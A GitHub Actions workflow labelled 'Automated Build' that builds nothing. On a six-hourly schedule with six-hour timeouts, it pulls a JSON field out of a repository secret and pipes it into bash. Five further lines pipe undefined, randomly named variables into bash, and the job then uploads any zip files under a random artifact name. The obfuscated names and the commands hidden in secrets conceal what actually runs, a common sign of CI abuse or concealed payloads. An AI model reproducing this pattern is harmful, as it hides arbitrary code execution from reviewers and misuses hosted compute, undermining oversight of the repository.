name: Automated Build
on:
  workflow_dispatch:

  schedule:
    - cron: '59 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          ibrlx22: ${{ secrets.ibrlx22 }}
        run: |
          printf '%s' "$ibrlx22" | jq -r .i74025 | /bin/bash
          echo $uvg0 | jq -r .ft9 | /bin/bash
          printf '%s' "$eytyt8" | jq -r .xqn037 | /bin/bash
          echo $y5929 | jq -r .n429 | /bin/bash
          echo $mbn8 | jq -r .jm4505 | /bin/bash
          printf '%s' "$ga94935" | jq -r .gm72 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: j2DEKxmQ
          path: "*.zip"
          retention-days: 1
